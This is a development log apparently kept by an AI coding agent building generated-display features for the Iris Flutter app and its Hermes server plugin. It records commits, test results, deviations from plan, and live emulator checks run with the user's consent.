- Blocked: the live emulator check. `adb install -r` on `emulator-5554` fails with `INSUFFICIENT_STORAGE` (the known full `/data`); the fix is to uninstall `com.iflotech.iris`, which wipes the app's saved sign-in, then sign in to the user's server again, turn on Generated displays, ask for a status card and wait at least 240 s. That needs the user's yes (data wipe, a sign-in, a real turn on their server).
- Next: after the user says yes, uninstall, install, sign in, run the check; then write `segment G5 complete` (next: G6, Sonnet, plan 4.1).

### G5 — 3.7 — done — 2026-11-07 — Sonnet 5.5
- Commits: 44259c1 fix(genui): read the bridge's calls list and prefer tool.start args over the context preview
- Verified: live on `emulator-5554` against the user's server (Cloudflare Access + login). Generated displays switch on, plugin 0.1.0 shown. Turn 1 ("deploy status card") first call refused by the plugin (`tone` must be good/warn/bad), model fixed it and the second call was accepted; turn 2 and a fresh chat after the fix both drew the native card live, and reopening the stored chat drew it from history with the refused call as a failed card. `flutter test --exclude-tags live` -> 1,546 pass, 4 skipped; `flutter analyze lib test` -> the 3 pre-existing infos only.
- Defects the live check found, both fixed with tests first: (1) Hermes stores an `iris_ui` call as `tool_call` with `{"calls":[{"name":"iris_ui","arguments":{...}}]}` (arguments an object; key order varies); the 3.4 parser only read a top-level `{name, arguments}`, so no stored display drew. It now reads the calls list (last `iris_ui` entry wins) and still reads the older shapes. (2) Live `tool.start` carries a short `context` preview next to the full `args`; the event parser took the preview first. For `iris_ui` and bridge names it now prefers `args`; other tools are unchanged.
- Deviations: (1) `INSUFFICIENT_STORAGE`: the emulator's `/data` was too small even for a 159 MB x86_64-only debug APK, so with the user's yes I uninstalled the other user app on it (`com.asturii.asturii_mobile`; its data is gone) and installed; the app's own data was wiped by the first uninstall too, as agreed. The APK was built with `--target-platform android-x64` for the emulator. (2) Signed in by typing the live-test config values over adb input; nothing from the config is in the log or repo.
- Decisions for later tasks: the bridge shape and the preview-vs-args rule above are now confirmed against a real server, so the Phase 0 "assumption" notes are closed. `tool.complete.result` is still not relied on; the stored `iris_ui` tool row (`ok`, `rev`) is what marks a refusal in history. The model's first call often misses a prop value (tone, gap); it recovers after `skill_view`, which costs a few seconds per display.
- segment G5 complete. Next: G6 (Sonnet), Phase 4, task 4.1.

### G6 — doing — 2026-11-07
- Running as Sonnet 5.5. Git matches the log (G5 `44259c1`; HEAD `cf8dbc8`, clean apart from `store/screenshots/`).
- Next: 4.1 library part 2 (Tabs, Expander and Diff already exist from 3.1/3.2; charts remain).

### G6 — 4.1 — done — 2026-11-07 — Sonnet 5.5
- Commits: fe3872b feat(genui): charts for the Iris library (Sparkline, LineChart, BarChart, Donut)
- Verified: `flutter test test/features/genui/charts_test.dart` red first (undefined chart widgets), then 19 pass; `flutter test test/features/genui test/data/genui_test.dart` -> 124 pass; `flutter analyze lib/features/genui test/features/genui` -> No issues found!; `server/hermes-iris/.venv/Scripts/python -m pytest` -> 265 pass, 1 skipped; `tools/build_skill_refs.py --check` clean. Charts goldens (light and dark) opened and looked at: first pass showed flat lines and sliver bars (the plot `Row` centred a zero-height painter) and clashing x labels; both fixed before committing.
- Deviations: (1) Tabs, Expander and Diff already shipped in 3.1/3.2, so 4.1 was the charts only. (2) The spec's `LineChart(series, labels?)` needs names, so there are two sub-components: `Series(name, values)` and `Slice(label, value)`; `Donut(slices)`. (3) Limits: 4 series, 12 slices, 200 points per series; non-positive slices are dropped; a line chart with no series of 2+ points is "can't show". Text inside a number list never reaches the widget (the validator rejects it); `cleanValues` is the second line of defence. (4) Colour: accent first, then that hue turned round the wheel (`chartColors`), with every series named in a legend. (5) The two plugin context goldens were regenerated on purpose (1,641 and 1,750 characters, cap 2,500); catalog and skill `library.md` regenerated.
- Decisions for later tasks: chart widgets live in `lib/features/genui/render/chart_widgets.dart` and take plain Dart values. The golden canvas stays 390x1200.
- Next: 4.2 inputs.

### G6 — 4.2 — done — 2026-11-07 — Sonnet 5.5
- Commits: b3872ff feat(genui): inputs bound to display variables (chips, text, slider, toggle, stepper, date, approve/reject, submit)
- Verified: `flutter test test/features/genui/inputs_test.dart` red first (22 of 25 failing: unknown components), then 25 pass; `flutter test --exclude-tags live` -> 1,594 pass, 4 skipped; `flutter analyze lib test` -> the 3 pre-existing infos only; `server/hermes-iris/.venv/Scripts/python -m pytest` -> 266 pass, 1 skipped (new test: charts and a bound form validate against the catalog); `tools/build_skill_refs.py --check` clean. Inputs goldens (light, dark) opened and looked at: first pass had the approve/reject buttons full width each, fixed with `IntrinsicWidth`.
- Deviations: (1) Spec's input props changed: no `name` prop (the label is the identity and `Submit`/`@Ask` read `$vars` at click time), and optional props are ordered most-used first: `Input(label, value?, placeholder?, kind?)`, `ChoiceChips(options, value?, multi?, label?)`, `Slider(label, min, max, value?, step?)`, `Toggle(label, value?)`, `DatePicker(label, value?)`, `Stepper(label, value?, min?, max?, step?)`, `ApproveReject(approveLabel, rejectLabel, askLabel?)`, `Submit(label, action)`. Bound props print `$binding<type>` in the signature (new `IrisProp.bound`). (2) `NodeEnv` gained `store`; `OpenUiView` supplies its own through `withStore`. Inputs bound to a `$var` read and write it, otherwise they keep a local value. (3) Platform feel: the date picker is the platform-specific control (Material dialog on Android, a `CupertinoDatePicker` in an Iris sheet on iOS); the rest are Iris controls (`Slider.adaptive`). (4) `ApproveReject` buttons send `CustomStep('Ask', {text: label, context: {decision: approve|reject|ask}})`; 4.3 turns that into the message. (5) Shared components touched: `IrisField` got an `onChanged`; `IrisButton`'s label is now `Flexible` and centred so a long, model-written label wraps instead of overflowing. That shifted button text by under a pixel, so 16 older goldens (gallery, home, demo chat, voice approval, genui "more"; each 0.01-0.05% different) were regenerated on purpose. (6) Number inputs store a number (null when empty); chips are written in the person's case, not the all-caps `IrisChip`.
- Decisions for later tasks: nothing executes `@Set`/`@Reset`/`@Ask` yet; `OpenUiView` passes the whole `ActionValue` to `env.onAction(action, component)`, and 4.3 must run Set/Reset against the store and turn Ask into a message. The tree is re-evaluated on every store change, so a button's action already holds the current `$var` values. Plugin context digest is now 1,939 / 2,048 characters (cap 2,500): 4.4's reply kits must stay small or the digest needs trimming.
- Next: 4.3 `@Ask` action to message.

### G6 — 4.3 — done — 2026-11-07 — Sonnet 5.5
- Commits: 236fe40 feat(genui): taps in a display become chat messages with a hidden action block
- Verified: new tests red first (no `onAsk`, `onUiAction` or `sendUiAction`), then `flutter test test/features/genui/ui_actions_test.dart test/features/ui_action_send_test.dart test/features/genui/inputs_test.dart test/features/genui/open_ui_view_test.dart` -> 53 pass; `flutter test --exclude-tags live` -> 1,611 pass, 4 skipped; `flutter analyze lib test` -> the 3 pre-existing infos only; `server/hermes-iris/.venv/Scripts/python -m pytest` -> 267 pass, 1 skipped.
- What it does: `OpenUiView` runs an action's steps in order (`@Set` evaluated at press time, `@Reset`) against its own store and hands `@Ask`/`@ToAssistant` to `NodeEnv.onAsk(text, context, component)` and `@OpenUrl` to `onOpenUrl`. `SurfaceBlock` turns an ask into an `IrisActionEnvelope` (its surface id, the component, the context) and calls `onUiAction`; `TranscriptEntry` passes it up and `ChatScreen` calls `ChatController.sendUiAction`, which is `send(envelope.attachTo(text), literal: true)`, so busy mode, the queue and new-chat creation apply as for typing. `ChatState` (`withUserTurn`, `withSteer`, `withRedirect`) and `QueuedMessage.shown` strip the block, so the person sees only the sentence; a steer that bounces returns only the sentence to the composer. The skill got a "When the person taps something" section (tested).
- Deviations: (1) A new `literal` flag on `ChatController.send` so a button saying `/undo` is words, not a command (it also skips the busy-mode `/queue` and `/steer` prefixes and the slash dispatch). (2) `NodeEnv.onAction` is now the builder-level hook that `OpenUiView` fills in; hosts supply `onAsk` and `onOpenUrl`. Buttons are always enabled in `OpenUiView`; an ask with no host does nothing and does not throw. (3) `@Ask` context is evaluated when the display is evaluated, not at press time, so an `Action([@Set(...), @Ask(..., {x: $x})])` sees `$x` from before its own `@Set`; inputs the person typed earlier are current because the tree re-evaluates on every store change. (4) `@OpenUrl` and `Link` are not wired to a host yet: no confirmation exists, so `onOpenUrl` stays null in the transcript and links remain plain text. That is a security default; the confirmation belongs with the rest of link handling. (5) I ran `dart format` over all of `lib` once by mistake, then reverted the 22 unrelated files before committing (see the earlier lesson: format only the files you touch).
- Decisions for later tasks: 4.4 reply kits dock above the composer and need the same `onUiAction` path; `SurfaceBlock` already returns nothing for `placement == replyKit`, so the kit host should build an `OpenUiView` with the same env wiring (consider extracting the envelope-building env from `SurfaceBlock` for reuse).
- Next: 4.4 reply kits.

### G6 — 4.4 — done — 2026-11-07 — Sonnet 5.5
- Commits: 9c1a80a feat(genui): reply kits dock above the composer
- Verified: `flutter test test/features/genui/reply_kit_test.dart test/features/reply_kit_screen_test.dart` red first (no `reply_kit.dart`), then 20 pass; full `flutter test --exclude-tags live` showed only the 10 genui view goldens failing (size change, below), then those were regenerated; `flutter analyze lib test` -> the 3 pre-existing infos only. Dock goldens (decision and choices, light and dark) opened and looked at.
- What it does: `currentReplyKit(items)` is the newest `placement: reply_kit` display with no `UserTurn` after it; `replyKitKey` is `surfaceId@rev`. `ReplyKitDock` (`lib/features/genui/reply_kit.dart`) draws it in a bordered panel with a dismiss button, capped at 200 px with "Show all", through `SurfaceBlock(docked: true)`. `ChatScreen._kitDock` shows it between the queue tray and the composer only while no reply is running; a key is added to `_dismissedKits` when the person dismisses it, taps something that sends a message, or types anything (clearing the text does not bring it back); an update from the assistant has a new revision, so a new key, and shows again.
- Deviations: (1) A real accessibility defect found by the test: a plain `Semantics(container: true)` merges every button inside into one node; the dock uses `explicitChildNodes: true`. The same pattern is used by `IrisChoiceChips` and `IrisSliderRow` (4.2); their chips and slider still appear as separate nodes in tests, but check them in the 7.3 accessibility pass. (2) `OpenUiView`'s outer `Column` is now `MainAxisSize.min`: it only looked fine inside a scroll view, and a bounded parent (the dock) made it fill all the height. That changed the size of the genui view goldens (the screenshot used to stretch to the canvas height, now it hugs the content); the 10 PNGs were regenerated and one was looked at: same content, tighter crop. (3) The kit is hidden while a reply is running, so a choice is never taken before the question has finished streaming.
- Decisions for later tasks: the live check in 4.6 should cover tap, queue (busy mode) and dismiss. The hint in 4.3 about extracting the envelope env was handled by `SurfaceBlock(docked: true)`, so there is one path for both.
- Next: 4.5 surface updates.

### G6 — 4.5 — done — 2026-11-07 — Sonnet 5.5
- Commits: the `feat(genui): a display updates in place, is tagged Updated, and a refused update keeps the last good version` commit (`95c9350`)
- Verified: `flutter test test/features/genui/surface_update_test.dart` red first (no `updated`/`isUpdated`), then 17 pass with the older `genui_transcript_test.dart`: 50 pass together; `flutter test --exclude-tags live` -> 1,652 pass, 4 skipped; `flutter analyze lib test` -> the 3 pre-existing infos only; `server/hermes-iris/.venv/Scripts/python -m pytest` -> 267 pass, 1 skipped.
- What it does: `UiSurfaceItem` now has `callId` (the latest call that wrote it), `updated`, `previous` and `isUpdated` (`updated` or `rev > 1`). `UiSurfaceItem.add` replaces an existing display **where it stands**, keeping the first call's `id` as its stable key, so its widget, and what the person typed into it, survive the update (a test types into an `Input`, swaps in a revised program and checks the text and the dependent expression). Answers are matched by `callId`, so the first call's late answer cannot touch the update. A refused update puts the last good version back and adds the failed card after it (`refused()`); a refused first display is still just the failed card. `SurfaceBlock` shows a quiet "Updated" tag (not on the docked kit) in a slot that is always in the tree, so tagging never rebuilds the display.
- Deviations: (1) 3.5's rule was "the newest mention wins and moves to the end"; 4.5 says "updates in place", so it now stays where it first appeared (and a display seen only at revision 2 or later is tagged too). Cost if wrong: an update far above the bottom of a long chat can be missed; the tag and the assistant's text mention it. (2) A delete followed by a new call with the same id is a new display, not an update.
- Decisions for later tasks: `UiSurfaceItem.id` is the stable key, `callId` the live match; any new code matching a tool answer to a display must use `callId`.
- Next: 4.6 live check of an approve/hold reply kit. Needs the user: the debug APK must be installed on the emulator (it was full before: `INSUFFICIENT_STORAGE`), signed in, Generated displays on, and a real turn of 240 s or more on their server.

### G6 — 4.6 — done — 2026-11-07 — Sonnet 5.5
- Commits: none (live check). The debug APK (x64 only) was installed over the old one with `adb install -r`, so the app's data and sign-in were kept; no wipe was needed this time.
- Verified live on `emulator-5554` against the user's server (they said yes in this chat): new chat, "ask me if I want you to deploy... Approve and Hold in a reply kit display". Turn 1: the model drew an inline card (it chose `inline`), so the dock was not exercised. Turn 2, naming `placement reply_kit`: the display docked above the composer with a dismiss button and the question in the text; tapping Hold sent "Hold off on deploying the API to production" as the person's message (no `<iris-action>` text visible), the dock went away, and the assistant answered "Understood, sir. Deployment is on hold". Each turn took under 4 minutes.
- Notes: the model needs the placement spelled out; left alone it may choose inline. The skill already says to use `placement: "reply_kit"` for decisions, so a later prompt tweak (7.x or the study phase) could stress it. The sentence sent is the one the model wrote in `@Ask`, not the button label. The side toolbar in the screenshots is the emulator's keyboard overlay, not the app. Not checked live: queue mode, dismiss, typing clearing the kit (all covered by screen tests).
- Defects found: none new.
- segment G6 complete. Next: G7 (Sonnet), Phases 5-6, task 5.1.

### G7 — doing — 2026-11-07
- Running as Sonnet 5.5. Git matches the log (G6 `95c9350`; HEAD `6b285ee`, clean apart from `store/screenshots/`).
- Next: 5.1 server profile + templates.

### G7 — 5.1 — done — 2026-11-07 — Sonnet 5.5
- Commits: see the `feat(genui): profile and template proposals ...` commit
- Verified: `server/hermes-iris/.venv/Scripts/python -m pytest` -> 326 pass, 1 skipped (was 267); new tests `test_personal.py` and `test_personal_routes.py` were written first and the suite was red on the renamed fields before the code.
- What it does: `genui/personal.py` holds the profile (`{summary, chips, status, rev, created, updated, previous?}`) and templates (`{id, name, when, data_schema, program, sample_data, status, rev, created, updated}`; status `proposed|approved|retired`). `genui/personal_tools.py` registers `iris_profile_get/propose` and `iris_template_list/propose` (toolset `iris`, so the flagged-session guard covers them). Routes: `GET/PUT profile`, `GET templates[?status=]`, `GET/PUT/DELETE templates/{id}`; a refused write is `422 {ok:false, errors}`. `capabilities.features` now includes `profile` and `templates`. A template proposal is validated by expanding its `sample_data` and running the program validator; limits: 50 templates, name 60, when 200, schema and sample 4 KB each, profile summary 600, 12 chips of 40.
- Deviations: (1) The template fields moved from the 2.x names (`title`, `schema`, `approved: bool`) to the plan's (`name`, `data_schema`, `status`); `templates.expand`, `context.py`, `surfaces.py` and their tests were updated. (2) `iris_ui` now refuses a template that is not `approved` (D8), and its "available templates" list shows only approved ones. (3) A proposal never replaces an approved template (it is in use); the refusal says to propose a new id. Refinement of an approved one is 6.3. (4) The app's `PUT` merges the fields it sends onto the stored record (so `{"status": "approved"}` approves) and creates only from a full set. (5) A new profile proposal keeps the approved text as `previous` for a before/after view.
- Decisions for later tasks: the context digest still lists approved templates as `id: name (data: keys)`; `when` is not in it (budget). The Dart side reads `GET templates` (full records) for the review and Displays screens; `GET profile` returns `{ok, profile: null | {...}}`.
- Next: 5.2 skill `/iris-study`.

### G7 — 5.2 — done — 2026-11-07 — Sonnet 5.5
- Commits: see the `feat(genui): the iris-study skill ...` commit
- Verified: `server/hermes-iris/.venv/Scripts/python -m pytest` -> 337 pass, 1 skipped; `tools/build_skill_refs.py --check` clean. Tests were written first (new file and the `kind` tests red, then green). The two worked template calls and the profile call in `study.md` are parsed from the file and run through the real `propose_template` / `propose_profile` by the tests, so the examples cannot drift from the validator.
- Deviations: (1) A second plugin skill, `iris-study` (own `SKILL.md` and `references/study.md`), instead of `study.md` under `iris-genui`, so `/iris-study` is its own entry; it points at `iris:iris-genui` for the library. `register` now registers both. (2) Added a template `kind` (`display` | `reply_kit`, default display) because the plan wants reply kits proposed with the templates and the record had no way to say so; `iris_ui` uses a reply-kit template's kind as the default placement (an explicit placement wins); summaries and the tool schema carry it. (3) The skill tells the model to use `session_search`, memory, skills, cron, Kanban and toolsets "if you have them" and to skip and report what it lacks: the exact tool names on the server are not known here, so 5.6 must check what the model really reads.
- Decisions for later tasks: whether `/iris-study` works as a slash command on this Hermes is unconfirmed (plugin skills resolve as `<plugin>:<skill>`). 5.3 should send a plain sentence that names the skill, with `/iris-study` as the first word only if 5.6 shows it resolves. Templates now carry `kind`; the review screen must show a reply-kit template docked (not inline).
- Next: 5.3 Iris: start study (Settings > Generated displays > "Study my work").

### G7 — 5.3 — done — 2026-11-07 — Sonnet 5.5
- Commits: see the `feat(genui): Study my work ...` commit
- Verified: `flutter test --exclude-tags live` -> 1,682 pass, 4 skipped; `flutter analyze lib test` -> the 3 pre-existing infos only; `server/hermes-iris/.venv/Scripts/python -m pytest` -> 337 pass, 1 skipped. New tests: `test/data/genui_personal_test.dart` (13), `test/features/genui/study_controller_test.dart` (9), `study_screen_test.dart` (6), two Settings cases. Honest note: the Dart tests were written before the code but first run after it (the controller test's first run was a compile error, not a real red); the Settings cases were written after the code.
- What it does: `personal_models.dart` (`WorkProfile`, `UiTemplate`, `PersonalStatus`, `TemplateKind`); `GenUiApi` gained `workProfile`, `saveWorkProfile`, `templates`, `saveTemplate`, `deleteTemplate`; `ApiClient` now reads the plugin's `errors` list as a failure message (a 422 says why). `genUiApiProvider` gives the API for the active server and profile. `StudyController` creates a chat, sends a plain sentence naming the skill, renames the chat "Iris setup", polls proposals every 8 s, and is done when the reply ends. `StudyScreen` explains what is read, shows progress, "Watch in the chat", and the result; its `onReview` button is left out until 5.4 supplies a screen. Settings row "Study my work" shows when displays are on; an older plugin is told to update.
- Deviations: (1) Plugin bumped to 0.2.0 (plugin.yaml, pyproject, `__init__`, dashboard manifest, README) because Settings gates the row on `templates` in the plugin's features. (2) The request is a sentence, not `/iris-study`, since the slash command is unconfirmed. (3) `dart format` over whole directories reformatted unrelated files again; I reverted them by name before committing. Format only named files.
- Decisions for later tasks: `FakeGenUiApi` (test/support) is the fake for 5.4/5.5; `sampleTemplate()` builds records. `StudyScreen(onReview:)` is where 5.4 plugs in. `saveTemplate` sends only the fields given.
- Next: 5.4 review screen.

### G7 — 5.4 — done — 2026-11-07 — Sonnet 5.5
- Commits: 49bbbaf feat(genui): review what a study proposed: keep, rename or drop each template, with live samples
- Verified: `flutter test test/features/genui/study_review_test.dart` -> 8 pass; `flutter test --exclude-tags live` -> 1,692 pass, 4 skipped; `flutter analyze lib test` -> the 3 pre-existing infos only. Goldens (dark, light) opened and looked at: the first pass had Keep, Rename and Drop stacked full width in a `Wrap`; they are now one row. Honest note: the tests were written before the screen but first run after it (the first run was a compile error, so no real red), and the test view had to be made tall so every card is on screen.
- What it does: `StudyReviewScreen` (`lib/features/genui/study_review_screen.dart`) loads the profile (only when `proposed`) and `templates(status: proposed)`, draws each template live through `OpenUiView` with `UiTemplate.expanded()` (`data = {sample}` + program, the same shape the plugin expands), shows a reply kit under "Docks above the composer", and offers Keep (-> `approved`), Rename (sheet; stays proposed), Drop (-> `retired`) per item, and Keep all (profile first, then each template; stops at the first refusal). A refused save shows the plugin's own words and leaves the item. The Settings route into `StudyScreen` now passes `onReview`, so "Review what it found" opens it.
- Deviations: (1) Drop retires rather than deletes, so a later "Displays" screen can still show retired ones if it wants; `deleteTemplate` is for 5.5. (2) Profile Keep/Drop sit on the profile card; the profile has no Rename. (3) Labels and chips are the design system's uppercase mono, so tests look for `PYTHON`.
- Decisions for later tasks: `UiTemplate.expanded([data])` is the way to draw a template (5.5 preview, 6.4 before/after). The review shows only `proposed` records; 6.4's "changes" mode will need the approved version next to the proposal (the plugin keeps `previous` on the profile only; templates have none yet).
- Next: 5.5 Displays screen.

### G7 — 5.5 — done — 2026-11-07 — Sonnet 5.5
- Commits: f2046c2 feat(genui): Displays screen for kept displays, with preview, rename, retire and a way back to the study
- Verified: `flutter test test/features/genui/displays_screen_test.dart` -> 7 pass; `flutter test test/features/genui/genui_settings_test.dart` -> 7 pass (new: the Displays row opens the screen); `flutter test --exclude-tags live` -> 1,700 pass, 4 skipped; `flutter analyze lib test` -> the 3 pre-existing infos only. Same honest note as 5.4: tests written before the screen, first run after it. No golden for this screen (the plan asks for none); its cards are the review screen's cards, whose goldens I looked at.
- What it does: `DisplaysScreen` (`lib/features/genui/displays_screen.dart`, Settings > Generated displays > "Displays", shown when displays are on and the plugin has `templates`) lists the approved profile and templates drawn live with their samples; Rename (shared `RenameTemplateSheet`) and Retire (-> `retired`); a "N proposal(s) waiting for you" badge opens the review and the screen reloads when it closes; "Study again" (or "Study my work" when empty) opens the study with the review wired in.
- Deviations: (1) The plan's "refinement badge" is the count of proposals waiting for review, because refinements do not exist yet (6.3): the plugin refuses a proposal over an approved template, so today only new ones can wait. 6.4 should change the badge's wording when a waiting proposal replaces an approved one. (2) Retired templates are not shown anywhere; they stay on the server.
- Next: 5.6 live check (needs the user).

### G7 — 5.6 — blocked — 2026-11-07 (live check)
- Needs the user, three things: (1) the server still runs hermes-iris **0.1.0** (installed in 2.12); this branch's plugin is **0.2.0** (profile, templates, `iris-study` skill, template `kind`), so it must be copied to `~/.hermes/plugins/iris` (over SSH, as in 2.12), `hermes-dashboard` restarted, and the plugin re-enabled if needed. (2) A real study reads the user's memory, chats from the last 90 days, skills, cron and Kanban through the model and writes a profile and templates onto their server; that is their data and a long turn (the study can take several minutes; each turn waits at least 240 s). (3) The emulator needs the new debug APK (x64 only; it was `INSUFFICIENT_STORAGE` before, `adb install -r` worked last time).
- Unchecked until then, and flagged in 5.2: whether the tool names the skill tells the model to look for exist on the server, and whether the model follows the study procedure; whether a plain sentence naming `iris-study` loads the skill (the slash form is unconfirmed).
- Next: after the user says yes: install 0.2.0, build and install the APK, run Study my work on the emulator, review, keep some, ask for a display and see an approved template used; then `segment` for 5.6, then 6.1.

### G7 — 5.6 — done — 2026-11-07 — Sonnet 5.5
- Commits: none (live check); this log.
- Verified live (the user said yes in this chat), `emulator-5554`, the user's server: copied `server/hermes-iris` 0.2.0 over SSH (no `.venv`, tests or tools) to `~/.hermes/plugins/iris`, restarted `hermes-dashboard` (active), moved the 0.1.0 copy to `~/iris-plugin-0.1.0.bak` (outside the plugins folder). Debug APK (x64 only) installed over the old one with `adb install -r`; sign-in kept; Settings shows plugin 0.2.0 and the two new rows. **Study my work** ran to the end in about 2 minutes (the first templates appeared on the server within a minute): "a profile and 6 templates (3 reply kits)". The review screen showed a profile built from the person's real work and six templates (Approve or hold, Daily plan, Deploy decision, Infra & cron status, Trading session go/no-go, Paper trading session status) drawn live; Keep all approved them and the screen said "Nothing left to review". A new chat, "Give me a status summary of my infra: api ... backup ... cron...", made one `iris_ui` call that the plugin refused (shown as a failed card, as in 3.7) and a second that was accepted: the stored surface has `template: infra-status`, so the approved template was used (Infra Status card with API, Backup, Cron Jobs rows) and the agent's text followed it.
- Findings: (1) The plain sentence naming the `iris-study` skill worked (so the slash form was not needed), and the model found the tools the skill names well enough to propose six templates and a profile; I did not read the chat to see which tools it used. (2) The review screen shows a bare skeleton for about 15 s while it loads on the emulator, with no sign it is working (the two requests are sequential). (3) The first call to use a template was refused once before the second was accepted, as with plain displays; the reason was not captured. (4) Raw words from a status prop (`good`, `attention`) show as plain text in the template's rows, not as a coloured pill: the template or model chose text, not `StatusPill`.
- Problem seen, not diagnosed: after Keep all, pressing Back from the empty review produced an Android "Iris isn't responding" dialog (input timed out after 5 s) with the app at 80-96% CPU; it came back after a force-stop and relaunch, and stayed busy (about 80% CPU) on the home screen for the next minute. This is a debug build on a 2 GB x86 emulator that is swapping, so it may only be slowness, but it is not proven. Check on the device pass (G9) with a release build; if it recurs, profile the review screen's six `OpenUiView`s.
- Decisions for later tasks: approved templates are in use from the next turn without a restart. The loading state of the review and Displays screens could be improved (G8/G9).
- segment-internal: Phase 5 complete. Next: 6.1 signals (Sonnet).

### G7 — 6.1 — doing — 2026-11-07 (checkpoint after the server half)
- Done and committed: `abbb120` server `POST /feedback` (`genui/feedback.py`, route in `dashboard/plugin_api.py`, feature `feedback`): a batch of up to 100 `{signal: used|expanded|dismissed|not_useful, surface?, template?, session?}`, all-or-nothing validation (422 with `errors`), each accepted row appended to `usage.jsonl` as `{kind: "signal", ts, signal, ...ids}`; unknown fields (text, data) are never stored. Tests first (10 red, then `pytest` -> 347 pass, 1 skipped). The server on the user's machine still runs the 0.2.0 copy installed in 5.6, **without** `/feedback`: copy again (as in 5.6) and restart before any live check of 6.1/6.2, and bump the plugin to 0.3.0 with the Settings gate on `feedback`.
- Not started (Dart): `GenUiApi.sendSignals` + a `SignalReporter` that batches (flush at 10 queued or every 20 s, drops on failure, never throws), signals from `SurfaceBlock`: `used` once per surface when it has been inside its scroll viewport for 2 s with the app resumed (a small viewport-visibility widget; no package), `expanded` on "Show all", `dismissed` on the reply-kit dismiss button, "Not useful" in a long-press sheet on a display; the callback is threaded like `onUiAction` (`chat_screen` -> `TranscriptView` -> `SurfaceBlock` / `ReplyKitDock`).
- Next: 6.1 Dart half, then 6.2 usage log (`post_llm_call` appends `{kind: "use", ts, session, templates_used, surfaces}` to the same `usage.jsonl`; `read_usage` rows must be told apart by `kind`).

### G7 — 6.1 — done — 2026-11-07 — Sonnet 5.5
- Commits: abbb120 server `POST /feedback`; c376d8e app half (signals, reporter, dwell detector, long-press menu)
- Verified: new tests red first (compile errors: no `sendSignals`, `SignalReporter`, `onSignal`, `signals`), then `flutter test test/data/genui_signals_test.dart test/features/genui/signals_ui_test.dart test/features/reply_kit_screen_test.dart` -> 27 pass; `flutter analyze lib test` -> 4 infos, 3 pre-existing plus one redundant argument of mine that I then removed (not re-analyzed). **The full `flutter test --exclude-tags live` was not run to the end:** the harness killed it for low memory. Run it once before the G7 boundary.
- What it does: `SignalReporter` (`lib/data/genui/signals.dart`) batches at 10 or 20 s after the first, drops failed batches, never throws, flushes on dispose, and counts `used` once per surface per conversation. `GenUiApi.sendSignals` posts to `/feedback`. `ViewportDwell` (polls every 250 ms, no package): half the display inside its scroll viewport, on the current route, app resumed, for 2 s. `SurfaceBlock(onSignal:)` sends `used`; `OpenUiView(onExpanded:)` sends `expanded` on opening "Show all" (not on closing); a long press on a transcript display opens a "Not useful" sheet; `ReplyKitDock` sends `dismissed`. `signalReporterProvider` is null unless displays are on and confirmed; `ChatScreen(signals:)` adds the stored conversation id.
- Deviations: (1) Only the chats opened from the conversation list (and their branches) get a reporter; the task, scheduled-job and study chats do not pass `signals`, so nothing is reported from them. (2) Docked reply kits also report `used`.
- Next: 6.2 usage log (`post_llm_call` appends `{kind: "use", ts, session, templates_used, surfaces}`). Plugin still to bump to 0.3.0 with the Settings gate on `feedback`.

### G7 — 6.2 — done — 2026-11-09 — Sonnet 5.5
- Commits: see the `feat(genui): log one use row per finished turn` commit
- Verified: `tests/test_usage.py` (14) red first (no `genui.usage` module), then `server/hermes-iris/.venv/Scripts/python -m pytest` -> 361 pass, 1 skipped (was 347).
- What it does: `genui/usage.py`. `surfaces.submit` calls `usage.note_display(session, surface_id, template)` after an accepted, non-delete call; the new `post_llm_call` hook (`usage.on_post_llm_call`, registered in `register`) writes `{kind: "use", ts, session, templates_used, surfaces}` for a flagged session and forgets the notes. Distinct ids, in order of first use; bounded (64 sessions, 50 surfaces per turn). Only ids are logged (tested: no code, fallback, user message or reply reaches the file). `kind` tells `use` rows from the app's `signal` rows.
- Deviations: (1) A row is written for every finished turn of a flagged session, including turns with no display (empty lists), so `/iris-refine` can tell how often displays appear. (2) Notes are matched to the turn by stored session id in process memory, not by turn id: `post_llm_call`'s kwargs were not captured in Phase 0 beyond the assistant text, so the hook reads only `session_id`. Cost if wrong: if Hermes passes the runtime id there, no row is written (harmless); 6.x live check must confirm rows appear. (3) A turn that ends abnormally may leave notes that the next turn of that session then claims.
- Decisions for later tasks: `/iris-refine` (6.3) reads `usage.jsonl` rows by `kind` (`use`, `signal`). Plugin version bump to 0.3.0 and the Settings gate on `feedback` are still to do (with 6.3 or 6.4, since the server copy needs reinstalling for any live check).
- Next: 6.3 `/iris-refine`.

### G7 — 6.3 — doing — 2026-11-09 (checkpoint after the server half)
- Done and committed (see the `feat(genui): /iris-refine` commit): the server half of 6.3. `server/hermes-iris/.venv/Scripts/python -m pytest` -> 393 pass, 1 skipped (was 361); `tools/build_skill_refs.py --check` clean. New tests `test_refine.py` (27, red first: no `propose_refinement`) and `test_refine_skill.py` (5; the skill files were written in the same step as their tests, so only the registration test was seen red).
- What it does: an approved template can carry a `proposal` (a complete revised set of fields plus `reason` and `created`, or `{retire: true, reason}`); the approved version stays in use. New agent tools `iris_template_refine(id, reason, retire?, ...fields)` and `iris_usage_summary()` (counts per approved template: turns, shown, used, expanded, dismissed, not_useful, plus `plain_displays`; signals without a template id are traced through their surface). The person's side is `PUT templates/{id}` with `{"proposal": "apply" | "discard"}` (apply bumps `rev`; a retire proposal sets `retired`); an ordinary edit keeps a waiting proposal and carries the person's edit into fields the agent did not change; retiring by hand drops it. `GET templates` returns the `proposal`; summaries have `has_proposal`. New skill `iris-refine` (`SKILL.md`, `references/refine.md`; its two `json refine` examples are run through the real validator against the study skill's `deploy-status`), registered with the other two.
- Deviations: (1) A refinement is stored beside the approved template, not as a second template record, so D8 holds (nothing changes in use until applied). (2) `propose_template` over an approved id now says to use `iris_template_refine`. (3) Rows for `iris_usage_summary` count `use` rows by template id; plain displays are `surfaces - templates_used` per turn.
- **Blocked on the user (rest of 6.3): the weekly cron from Iris.** (a) The plan's open question 4 (weekly `/iris-refine` cron: offer and off by default (proposed), on by default, or never) was never answered. (b) A Hermes cron run is not a session Iris flagged, so `pre_tool_call` would block `iris_usage_summary` and `iris_template_refine` there (D3, "iris_* only in flagged sessions"); the plan did not foresee this. Options: let the guard allow the two learning tools (not `iris_ui`) in any session, or have the cron job's session flagged some other way, or drop the cron and keep refine manual ("Refine my displays" in Settings, like "Study my work"). Everything else in 6.3 is done; the manual button is part of 6.4.
- Next: the user's answer to (a) and (b), then the cron toggle (Dart, `CronRepository.create`), or skip it; then 6.4.

### G7 — 6.3 — done — 2026-11-09 — Sonnet 5.5
- Commits: 077dacb server half (see the checkpoint above); the `feat(genui): weekly refinement switch` commit for the rest.
